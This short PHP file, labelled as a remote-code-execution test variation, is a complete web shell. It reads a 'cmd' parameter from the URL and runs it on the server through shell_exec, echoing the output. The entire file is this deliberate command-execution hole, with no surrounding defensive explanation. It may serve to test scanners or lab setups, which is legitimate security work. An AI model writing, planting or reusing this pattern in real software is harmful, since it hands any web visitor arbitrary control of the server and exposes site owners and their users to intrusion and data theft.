<?php
// RCE test variation #9
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>